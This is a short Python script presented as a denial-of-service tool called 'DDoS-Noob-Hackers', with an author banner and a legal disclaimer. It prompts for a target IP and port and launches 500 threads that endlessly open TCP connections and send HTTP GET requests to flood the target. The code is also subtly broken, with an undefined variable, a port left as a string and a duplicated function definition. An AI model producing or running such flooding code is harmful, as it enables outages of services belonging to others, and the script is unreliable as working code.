print("[+] Tool Namee:DDoS-Noob-Hackers")

print("[+] Author:Yousuf Shafi'i Muhammad. Junior Programmer.")

print("[+] Version:1.0")

print("[+] Team:Junior Programmers.")

print("[+] Github:https://github.com/Yousuf9963/phone-num-info.")

print("[+] Follow me on Github: https://github.com/Yousuf9963.")

print("[-] Website muhammadabdirahman.wixsite.com/yousuf9963blog.")

print("[!] legal disclaimer: Usage of this Program for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.")

print("[+] I hope for you good future and i am willing that you will come high effort.")

print("")



import socket
import threading

target = input("Enter Target IP:")
port = input("Enter Target Default port:80 Port ")

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
      
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
  
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

